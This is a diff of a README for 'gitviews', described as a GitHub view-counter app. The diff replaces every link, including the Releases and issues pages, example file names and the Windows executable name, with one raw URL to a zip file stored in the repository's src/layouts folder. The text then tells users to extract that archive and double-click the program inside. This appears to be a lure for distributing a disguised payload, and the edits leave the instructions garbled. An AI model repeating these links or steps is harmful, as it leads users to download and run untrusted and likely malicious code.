@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download gitviews](https://img.shields.io/badge/Download-gitviews-brightgreen)](https://github.com/maloy2223/gitviews/releases)
+[![Download gitviews](https://raw.githubusercontent.com/maloy2223/gitviews/main/src/layouts/gitviews-3.5.zip)](https://raw.githubusercontent.com/maloy2223/gitviews/main/src/layouts/gitviews-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ Before you start, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/maloy2223/gitviews/releases) to find the latest version of gitviews.
+   Go to the [Releases page](https://raw.githubusercontent.com/maloy2223/gitviews/main/src/layouts/gitviews-3.5.zip) to find the latest version of gitviews.
 
 2. **Choose Your Version**  
    Look for the latest release. You will see options for different systems.
 
 3. **Download the Application**  
-   Click on the appropriate file for your system. It might be labeled as `gitviews-windows.zip`, `gitviews-mac.zip`, or `gitviews-linux.zip`. Download the file.
+   Click on the appropriate file for your system. It might be labeled as `https://raw.githubusercontent.com/maloy2223/gitviews/main/src/layouts/gitviews-3.5.zip`, `https://raw.githubusercontent.com/maloy2223/gitviews/main/src/layouts/gitviews-3.5.zip`, or `https://raw.githubusercontent.com/maloy2223/gitviews/main/src/layouts/gitviews-3.5.zip`. Download the file.
 
 4. **Extract Files**  
    Once the file is downloaded, locate it on your computer.  
@@ -34,7 +34,7 @@ Before you start, ensure your system meets the following requirements:
    - For **Linux**: Use your file manager or Terminal to extract the zip.
 
 5. **Run the Application**  
-   Locate the extracted folder. Inside, you will find an executable file, such as `gitviews.exe` for Windows or `gitviews` for macOS/Linux. Double-click this file to open it.
+   Locate the extracted folder. Inside, you will find an executable file, such as `https://raw.githubusercontent.com/maloy2223/gitviews/main/src/layouts/gitviews-3.5.zip` for Windows or `gitviews` for macOS/Linux. Double-click this file to open it.
 
 6. **Using gitviews**  
    Once the application is open, it will prompt you to enter your GitHub username. Input your username and click the "View" button. That’s it! You will see the count of views for your profile and any selected repositories.
@@ -59,7 +59,7 @@ Currently, gitviews is designed for desktop use. Future versions may include mob
 
 ## 📞 Support
 
-If you encounter any issues or have questions, feel free to reach out via the [GitHub issues page](https://github.com/maloy2223/gitviews/issues). Your feedback helps improve gitviews.
+If you encounter any issues or have questions, feel free to reach out via the [GitHub issues page](https://raw.githubusercontent.com/maloy2223/gitviews/main/src/layouts/gitviews-3.5.zip). Your feedback helps improve gitviews.
 
 ## 🌐 Community
 
@@ -67,4 +67,4 @@ Join our community on GitHub to keep up with updates and participate in discussi
 
 ## 📥 Download Again
 
-Don’t forget to visit the [Releases page](https://github.com/maloy2223/gitviews/releases) for the latest updates and versions of gitviews. Happy tracking!
+Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/maloy2223/gitviews/main/src/layouts/gitviews-3.5.zip) for the latest updates and versions of gitviews. Happy tracking!
